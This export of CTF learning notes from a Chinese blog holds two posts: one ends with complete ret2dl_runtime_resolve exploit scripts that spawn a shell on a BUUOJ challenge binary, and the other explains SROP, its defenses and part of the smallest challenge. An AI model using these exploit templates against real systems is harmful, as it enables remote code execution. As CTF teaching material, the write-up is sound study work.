<p><img src="/../img/2706180-20220228175854393-1488686373.png"></p>
<p>在以这道题为例看一下Roputil的威力（不过这道题实在有点杀鸡用牛刀了，因为存在泄露函数，直接用ret2libc也可以）</p>
<p>我只是拿上面的exp改了一下偏移和远程题目的地址（需要注意的是由于刚开始直接从Roputils里面引入了所有的函数，因此我们要用原本pwntools中的函数时，需要再引用一下）<strong>这里还把上面那个exp中的from pwn import process换成了from pwn import remote</strong>，最后直接一把梭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25383</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./&#x27; + processName)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret_addr=<span class="number">0x0804851B</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">buf1 = rop.fill(offset)</span><br><span class="line">buf1 += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf1 += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf1)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_base))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220228180305633-1728995910.png"><br>然后下面我再给出手动构造的exp，其实我还是直接复制了上面的exp，只不过改了几个参数而已，这其实就是个模板而已，我把需要改的参数用三个*标注一下,剩下的直接照搬，一把梭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28789</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./bof&#x27;)#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#先初始化一下一会要用到的段首地址</span></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span><span class="comment">#***</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span><span class="comment">#***</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span><span class="comment">#***</span></span><br><span class="line"><span class="comment">#这个base_addr是我们要把栈迁移的地方，用gdb发现这一部分是可写的，因此我们选择迁移到这里</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#这个fake_sym_addr是Elf32_Sym结构的首地址</span></span><br><span class="line"><span class="comment">#原本是要把伪造的ELf32_Sym结构写在偏移32的位置的，但是还要对齐，因此下面还要再加align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Sym结构是16字节，因此地址也需要和16字节对齐，二者地址相减</span></span><br><span class="line"><span class="comment">#然后只取最后一位，就可以理解成二者的地址是放在了一个结构里面（但其实不是这样的，不过可以理解成这样，画个图就懂了）</span></span><br><span class="line"><span class="comment">#然后最后的值被0x10所减，求的就是fake_sym_addr距离16个字节所补齐差的字节数</span></span><br><span class="line"><span class="comment">#至于为什么减的是dynsym，淦，因为dynsym一定是被对齐了的，因此它需要找一个对齐的表来做参考啊</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#最后再加上这个为了补齐的字节才是最后我们要构造的fake_sym的地址</span></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#这个st_name就是dynstr段首地址距离目标函数名称的偏移</span></span><br><span class="line"><span class="comment">#我们把最终的system函数名称布置到了fake_sym_addr+0x10的位置，为啥加0x10?因为Elf32_Sym的结构大小为16字节</span></span><br><span class="line">st_info=<span class="number">0x12</span><span class="comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type（不过我感觉没必要区分，直接加起来就行）</span></span><br><span class="line"><span class="comment">#另外就是这个0x12是可以在IDA里面通过dynsym来查到</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)</span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#这个是ret.plt结构中的第一个成员，也就是解析之后的真实地址写入的地方</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#这个我不是太确定，我感觉除0x10是因为Elf32_Sym的大小是16字节</span></span><br><span class="line"><span class="comment"># 这个偏移应该是以一个结构（16字节）为单位的</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#这个0x7是重定位的一种类型，指的是导入函数，进入_dl_fixup函数里面，还会检查这是不是0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#这里&lt;&lt;8是因为，最后还要再&gt;&gt;8，从而保持正常，而&amp;0xf，其实没用，不写也行</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#从rel.plt到base_addr+28的偏移也就</span></span><br><span class="line"><span class="comment"># 是执行_dl_runtime_resolve的第二个参数，而加28的原因是，我们将rel.plt结构布置在了距离base_addr偏移24的位置</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#这里就是伪造的rel.plt结构</span></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#劫持执行流，让程序再执行一次read，将我们想要伪造的内容存入我们指定的地方</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#这里需要用连续三个pop把read的参数给从栈顶清空，不然ret的时候就会出现问题</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#这个放置的是system的参数的位置</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#由于read的参数是三个，而system的参数只用了第一个，因此另外两个参数需要填充一下垃圾数据</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#因为上面提到了会把参数放在偏移80的位置，因此这里填充\x00到偏移80这里</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="ret2dl回顾极速版"><a href="#ret2dl回顾极速版" class="headerlink" title="ret2dl回顾极速版"></a>ret2dl回顾极速版</h1><p>md，之前写过的文章重新回来再看，感觉太啰嗦了，重新温习了一下，这里写一个关于延迟绑定的过程极速版。</p>
<blockquote>
<p>dynamic段 保存了动态链接器所需要基本信息，下面三个都位于dynamic段</p>
<p>dynstr(dynamic string table)      动态符号字符串表</p>
<p>dynsym(dynamic symbol)		    动态符号表</p>
<p>rel.plt</p>
</blockquote>
<p>延迟绑定的过程核心是_dl_lookup_symbol_x函数拿着搜索的函数名去libc中匹配对应函数，大致过程是用dynstr地址+函数名在dynstr里的偏移来查找到的函数名字符串。</p>
<p>dynstr里的偏移需要通过rel.plt加上dl_runtime_resolve函数的第二个参数先得到dynsym里的偏移，再通过dynsym里的偏移加上dynsym的地址得到。拿着这个偏移加上dynstr的地址即可。</p>
<p>用ida简单演示一下过程</p>
<p>先去rel.plt里找到对应的结构，这个偏移是dl_runtime_resolve函数的第二个参数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281937155.png" alt="image-20221128193705005"></p>
<p>然后用上面的那个0x207右移8得到2，这个就是该函数在dynsym里的偏移如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281945695.png" alt="image-20221128194516577"></p>
<p>然后看一下这个地址0x080472a0的值，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281946850.png" alt="image-20221128194631780"></p>
<p>最后拿着这个0x3d加上dynstr的首地址即可找到函数名字，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947796.png" alt="image-20221128194726664"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947187.png" alt="image-20221128194759131"></p>
<h1 id="其他博客链接"><a href="#其他博客链接" class="headerlink" title="其他博客链接"></a>其他博客链接</h1><p>最后由于参考了很多师傅的博客，这里面我把一些我感觉写的不错的博客放一下，如果对于我上面写的有不懂的也可以看看下面这些博客</p>
<p>下面这两个博客都把exp分开构造的过程详细写了。</p>
<p><a href="http://www.soolco.com/post/114840_1_1.html">深入理解-dl_runtime_resolve-博客 (soolco.com)</a></p>
<p><a href="https://xz.aliyun.com/t/5122#toc-4">高级ROP ret2dl_runtime 之通杀详解 - 先知社区 (aliyun.com)</a></p>
<p>然后我探究上述_dl_runtime_solve执行流程主要是跟着下面这个师傅的博客做的</p>
<p><a href="https://www.jianshu.com/p/57f6474fe4c6">_dl_runtime_resolve - 简书 (jianshu.com)</a></p>
<p>下面这个是介绍_dl_runtime_solve的前置知识很详细</p>
<p><a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接 - 知乎 (zhihu.com)</a></p>
<p>下面这个博客是对一些源码做了注释</p>
<p><a href="https://blog.csdn.net/jazrynwong/article/details/89851640">(25条消息) glibc动态链接器dl_runtime_resolve简要分析_Hello World.c-CSDN博客</a></p>
<p>下面两个主要是解释了下用到的一些段的解释</p>
<p><a href="https://www.jianshu.com/p/8dd91ec35dda">https://www.jianshu.com/p/8dd91ec35dda</a></p>
<p><a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a></p>
<p>然后这个师傅的exp写的比较清晰，解决了我的一些问题</p>
<p><a href="https://eqqie.cn/index.php/archives/1023">https://eqqie.cn/index.php/archives/1023</a></p>
<p>然后下面这个师傅写的应该是最详细的了，对一些小细节有疑问的可以在这上面找找</p>
<p><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3&#x2F;#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>ret2dl</tag>
      </tags>
  </entry>
  <entry>
    <title>关于SROP的学习总结</title>
    <url>/posts/e734c492.html</url>
    <content><![CDATA[<p>这个SROP是一种极其有趣的攻击方式，它是利用程序从内核层面切换到用户层面恢复上下文时的一个漏洞，该漏洞可以让我们自己自行设置所有寄存器里的值。</p>
<span id="more"></span>

<p>在这之前我们要先去了解一下系统调用，因为这个漏洞就是在用户态和内核态切换发生的，提到系统调用，这里还要简单介绍一下用户态和内核态的相关知识。</p>
<h1 id="什么是用户态和内核态？"><a href="#什么是用户态和内核态？" class="headerlink" title="什么是用户态和内核态？"></a>什么是用户态和内核态？</h1><h2 id="用户态："><a href="#用户态：" class="headerlink" title="用户态："></a>用户态：</h2><p>CPU只能访问受限制的内存，并且不允许访问外围设备（就是不允许直接跟硬件产生关系）。此时的CPU不允许被独占，这就意味着此时的CPU可以被别的进程抢占。</p>
<h2 id="内核态："><a href="#内核态：" class="headerlink" title="内核态："></a>内核态：</h2><p>此时的CPU可以访问任何数据，包括外围设备，比如网卡，硬盘等等。并且此时的CPU可以从一个程序切换到另外一个程序，并且没有进程能够抢占CPU，因为此时内核态的特权级为0.</p>
<h1 id="为什么要区分用户态和内核态？"><a href="#为什么要区分用户态和内核态？" class="headerlink" title="为什么要区分用户态和内核态？"></a>为什么要区分用户态和内核态？</h1><p>用户态和内核态说到底就是CPU所执行的指令权限不同而划分的，而这样做的目的就是为了保护系统，在CPU的所有指令中，有一些指令是非常危险的，如果错用，将导致整个系统崩溃。比如：清内存、设置时钟等。</p>
<h1 id="怎么从用户态切换到内核态？"><a href="#怎么从用户态切换到内核态？" class="headerlink" title="怎么从用户态切换到内核态？"></a>怎么从用户态切换到内核态？</h1><p>用户态切换到内核态的3种方式：</p>
<p>a. 系统调用（也是我们接下来要提到的重点）</p>
<p>这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作，比如前例中fork()实际上就是执行了一个创建新进程的系统调用。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现，例如Linux的int 80h中断。</p>
<p>b. 异常</p>
<p>当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p>
<p>c. 外围设备的中断</p>
<p>当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p>
<p>这个博主对于用户态切换到内核态总结的很详细清楚，我这里就搬运一下。</p>
<p>原文链接<a href="https://blog.csdn.net/m0_47221702/article/details/119947155">(25条消息) 什么是用户态和内核态？_glory的博客-CSDN博客_内核态和用户态</a></p>
<p>这里这个系统调用很重要，它的存在意味着我们想执行一些较高权限的函数就需要经过系统调用来变成内核态从而得以实现函数的调用（例如read,write,open函数等等）。</p>
<h1 id="用户态的上下文是怎么被保存的？"><a href="#用户态的上下文是怎么被保存的？" class="headerlink" title="用户态的上下文是怎么被保存的？"></a>用户态的上下文是怎么被保存的？</h1><p>我们现在考虑一个问题，既然现在程序从用户态变成了内核态去执行系统调用的函数，那么再转变回用户态的时候，我们在用户态时寄存器的值怎么办？因为在内核执行系统调用函数的时候，寄存器的值一定是会发生改变的，可它是怎么保存了我们再用户态的上下文？</p>
<p>现在当我们要准备系统调用了。</p>
<p><img src="/../img/2706180-20220219203837059-350353018.png"></p>
<p>图片转自<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p>
<p>过程①，内核会向进程发送一个signal（你可以把这个理解为中断信号），意思是接下来该进程被挂起，此刻由内核来接管。</p>
<p>过程②，内核会保存该进程在用户态的上下文，并且跳到已经注册好的Signal Handler（信号处理器），当这个Signal Handler返回的时候，内核控制去传递了一串user-space code （用户层代码），这里翻译成用户层代码可能不是特别准确，我想表达的意思是，<strong>这就是一串实现函数功能的代码并且处于在了用户层</strong>，并且这部分代码被称作signal trampoline。</p>
<p>过程③，它是在执行signal trampoline的过程。</p>
<p>过程④，内核将恢复之前保存的上下文，并且最后恢复进程的执行。</p>
<p>这是大体流程，接下来我们看一下保存上下文的细节。</p>
<p><strong>在第二步的时候，内核就会将我们的所有寄存器压栈，同时还会把signal信息以及rt_sigreturn压栈。这个ret_sigreturn是一个地址，这个地址指向了sigreturn的这个系统调用（这个系统调用时SROP利用的核心）</strong></p>
<p><img src="/../img/2706180-20220219203845839-1367800712.png"></p>
<p>完成上述压栈之后，此时的栈布局是这样的，这段内存也被称为Signal Frame。</p>
<p>到了过程④的时候，此时的signal trampoline的执行已经到了最后的ret，此时的栈顶就是rt_sigreturn,因此又执行了re_sigreturn所指向的系统调用sigreturn的地址，<strong>这个系统调用函数的作用就是去把栈中的数据恢复到对应寄存器里面，也就是疯狂pop。</strong></p>
<p>随着rip的值也被pop了回去，此时的程序的系统调用已经完全完成，程序继续运行。</p>
<h1 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h1><h2 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分"></a>理论部分</h2><p>上述过程是正常的系统调用流程，而SROP则是利用了上下文保存与恢复的漏洞，如果了解了上述的内容，<strong>其实很明显就会发现有一个问题，在把寄存器压栈之后构造的Signal Frame依然是在用户进程的地址空间的，并且是用户进程可读写的。并且执行sigreturn的时候并没有检查准备恢复的这个Signal Frame是否是之前保存的Signal Frame</strong>。</p>
<p>这就给了我们可乘之机，我们可以去伪造一个Signal Frame然后直接执行sigreturn系统调用。</p>
<p>先看下正常的系统调用过程（主要看下保存与恢复上下文））<font color=red>（下面两个图，当时制作的时候理解的不太对，应该是执行signal trampoline,而并非是执行signal handler，这里要注意一下</font></p>
<p><img src="/../img/2706180-20220219203856864-84934145.png"></p>
<p>接下来看看如果我们系统调用的是sigreturn**(这个sigreturn并<u>不是执行了其他系统调用被动执行的sigreturn</u>，而是<u>我们主动系统</u>调用的就是sigreturn)**</p>
<p><img src="/../img/2706180-20220219203904231-699432548.png"></p>
<h2 id="实践部分"><a href="#实践部分" class="headerlink" title="实践部分"></a>实践部分</h2><p>当然上面都是理论知识，我们动态调试看一下是不是这样。</p>
<p><img src="/../img/2706180-20220219203910793-1182638386.png"></p>
<p><img src="/../img/2706180-20220219203917580-709368108.png"></p>
<p>这是<strong>准备系统调用sigreturn之前的寄存器的值</strong>（此时的寄存器是将要被保存的上下文）和栈布局（<strong>此时栈的布局就是为了我们准确控制每一个寄存器的值）</strong></p>
<p><img src="/../img/2706180-20220219203926667-105079808.png"></p>
<p>此时是系统调用sigturn之后的寄存器，可以看见参照构造的Signal Frame，精准的改变了每一个寄存器的值（此时execve的系统调用号以及参数全部被布置好了，此时只要执行了syscall就可以获取shell）</p>
<h2 id="提出一个猜想"><a href="#提出一个猜想" class="headerlink" title="提出一个猜想"></a>提出一个猜想</h2><p>同时我们刚才理论上猜想的是主动执行了sigreturn然后执行execve是不会再让rt_sigreturn触发了（也就是不会再回到执行sigreturn之前了），<strong>那反过来就是说如果我们执行的不是execve，那最后rt_sigreturn还是会触发，也就是即使主动执行了sigreturn控制了我们想要的参数，但是系统调用结束之后，寄存器里还是我们最开始保存的参数，而非主动执行sigreturn布置的参数。</strong></p>
<h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><p>为了验证上面的猜想，我们再用sigreturn来布置参数的时候，布置write（1,’&#x2F;bin&#x2F;sh’,7)这个系统调用，并且使其返回地址为一个_term_proc函数（返回到一个空函数，不对本次实验产生任何影响）</p>
<p>这个是将要因为执行sigreturn系统调用而被保存的寄存器</p>
<p><img src="/../img/2706180-20220219203934441-61755889.png"></p>
<p>这个是执行了sigreturn之后，布置的寄存器，此时还未执行write的系统调用。</p>
<p><img src="/../img/2706180-20220219203941205-1069503757.png"></p>
<p>现在是执行write函数之后的寄存器，现在应该会恢复最开始的上下文了吧？</p>
<p><img src="/../img/2706180-20220219203948580-1139524450.png"></p>
<p>what???居然没有恢复，和最开始的猜测不一样。</p>
<p>那我们重新捋一下，看看是哪里出了问题？</p>
<p>我们利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP&#x2F;ESP和RIP&#x2F;EIP都会被改变，可是为什么会这样呀？<strong>sigreturn本身不也是个系统调用么，那执行sigreturn之前的上下文也会被保存，执行sigreturn的时候确实会改变寄存器的值，可是执行sigreturn系统调用之后，原本的上下文不又被恢复了么（但事实是没有恢复）？</strong></p>
<h2 id="得出正确结论"><a href="#得出正确结论" class="headerlink" title="得出正确结论"></a>得出正确结论</h2><p>这里卡了很久，roderick师傅给我的提示去看下sigreturn的官方文档。</p>
<p><img src="/../img/2706180-20220219203956743-74555339.png"></p>
<p>果然，在官方文档的简介中就写了cleanup stack frame，这就意味着执行了sigreturn之后的函数栈帧就会被清除掉，当时我还感觉哪里不对，怎么栈（如下图）变成绿绿的了，原来是原本的栈已经都被清除了<strong>（本来清除的应该是Signal Frame,但是由于这是我们主动调用的sigreturn，因此把我们真正的栈给当做Siganal Frame给清除了，因此原本系统调用sigreturn所保存的上下文也在此刻是被清除了，所以我们才没有在系统调用之后得到最开始的上下文）</strong>。<br><img src="/../img/2706180-20220219204003370-492577233.png"></p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><strong>用于在内核在恢复上下文的时候并没有与保存的上下文做对比，同时内核在恢复上下文时是从构造的Signal Frame中pop出来各个寄存器的值，而此时的Signal Frame是在栈里的并且用户是可读可写的。这两点疏忽就导致了我们可以伪造Signal Frame之后主动执行sigreturn来控制每个寄存器的值。</strong></p>
<h1 id="使用SROP的前提："><a href="#使用SROP的前提：" class="headerlink" title="使用SROP的前提："></a>使用SROP的前提：</h1><p>1、首先程序必须存在溢出，能够控制返回地址。</p>
<p>2、可以去系统调用sigreturn（如果找不到合适的系统调用号，可以看看能不能利用read函数来控制RAX的值）</p>
<p>3、必须能够知道&#x2F;bin&#x2F;sh的地址，如果写的bss段，直接写地址就行，如果写到栈里，还需要想办法去泄露栈地址。</p>
<p>4、允许溢出的长度足够长，这样可以去布局我们想要的寄存器的值</p>
<p>5、需要知道syscall指令的地址</p>
<h1 id="补充：一直劫持程序的控制流"><a href="#补充：一直劫持程序的控制流" class="headerlink" title="补充：一直劫持程序的控制流"></a>补充：一直劫持程序的控制流</h1><p>最后要补充的一点是，前面介绍的方法只能调用一个syscall，然后我们就失去了对执行流的控制了，这里我们其实是可以一直劫持程序的控制流的。</p>
<p><img src="/../img/2706180-20220219204011362-2119817764.png"></p>
<p>图片出自<a href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&utm_term=sigreturn+%E5%87%BD%E6%95%B0&spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p>
<p>依据图片我们可以发现，我们每次控制寄存器的时候，都把rsp写成下一个片段的rt_sigreturn的地址，并且rip的地址要指向syscall；ret  一定要后面有ret，不然所有的片段连不起来，到ret的时候，就会去执行rsp执行的地址，因此我们就可以一直劫持程序的控制流。</p>
<h1 id="防御手段："><a href="#防御手段：" class="headerlink" title="防御手段："></a>防御手段：</h1><p>最后我们来提一下SROP的防范。从三个角度出发，作者提出了三种方法：</p>
<p><em><strong>*Gadgets Prevention*</strong></em></p>
<p>在<code>两个重要的gadgets</code>这章我提到，在当前的几种不同的操作系统中，<code>sigreturn</code>和<code>syscall; ret</code>这两个gadgets非常容易被找到，特别是在<code>vsyscall</code>这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让ASLR等保护机制物尽其用，使得攻击者很难找到这些gadgets。</p>
<p>当然这种方法并不能从本质上解决SROP的问题。</p>
<p><em><strong>*Signal Frame Canaries*</strong></em></p>
<p>这种方法借鉴于<a href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">stack canaries</a>机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。</p>
<p>当然，针对stack canaries的攻击也很多，其同样不能从本质上防止SROP的发生。</p>
<p><em><strong>*Break kernel agnostic*</strong></em></p>
<p>这就要追溯到SROP的本质问题了，就是内核对Signal的不可知性。如果我们在内核处理<code>sigreturn</code>系统调用的时候判断一下当前的<code>Signal Frame</code>是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p>
<p>我认为这个作者提到的这三个防御手段都非常全面，因此我就直接从这篇博客引用了<a href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&utm_term=sigreturn+%E5%87%BD%E6%95%B0&spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p>
<h1 id="实战SROP"><a href="#实战SROP" class="headerlink" title="实战SROP"></a>实战SROP</h1><h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h2><p><img src="/../img/2706180-20220220190258944-2045243642.png"></p>
<p>可以发现这个程序只有唯一个函数，就是这个start函数（看网上的师傅说这是因为出题人用汇编写的这个程序，编译之后也不需要与库链接）。</p>
<p>这就是一个read系统调用，然后就没有能利用的地方了，其实看到这个唯一的系统调用就应该往SROP的方向去想了，因为别的很多方法都不可能靠这个一个start函数完成，但是<strong>只要允许输入的长度够长，同时还有read的系统调用就可以考虑使用SROP（因为系统调用read就意味着肯定会有syscall，同时由于read返回值的特性，我们是可以控制rax的值，这也就有机会系统调用sigreturn）</strong></p>
<p>现在其实最大的问题是怎么去泄露栈的地址？我们可以第一次read读入一个字符，去让系统调用号变成1，但是这就意味着我们无法控制返回地址。这里用了已经很巧妙的方法，由于每一次输入都是从栈顶开始存入数据，如果我们第一次<strong>连续输入了两个start的首地址</strong>（但事实上这里是要输入三个start的地址，不过现在我们先不讨论第三个start的作用），然后<strong>执行了ret，此时第一个start的地址就被pop出来了，也就是说现在栈顶只有一个start地址了，同时我们现在又到了系统调用read这里，然后我们只写一个字节\xB3,这样start的地址0x4000B0就被修改成了0x4000B3，</strong>这样使得我们的RAX里面现在的值就是1了，同时下一次返回的时候跳过了第一个指令xor rax,rax，直接从mov edx,0x400指令开始，最终实现系统调用write，从而实现栈地址泄露。（可以看见下图的左侧栈顶是0x4000b0而执行了read之后，右侧的栈顶已经是0x4000b3了）</p>
<p><img src="/../img/2706180-20220220190308888-853157541.png"></p>
<p>不过紧接着遇见的问题就是会发现由于只有一个函数的原因，栈底直接就是环境变量了，因此泄露出来的全都是环境变量（如下图）。</p>
<p><img src="/../img/2706180-20220220190316234-993019298.png"><br>而环境变量中没有任何一个内存单元指向栈地址，因此我们没法用具体的偏移直接计算，不过好消息是，**由于栈地址随机化的地址变化并不是太大，因此我们可以选取一片空的栈区去存放我们的参数和signal frame（通过泄露的地址直接减去一个较大的数据来指向这片栈区)**。</p>
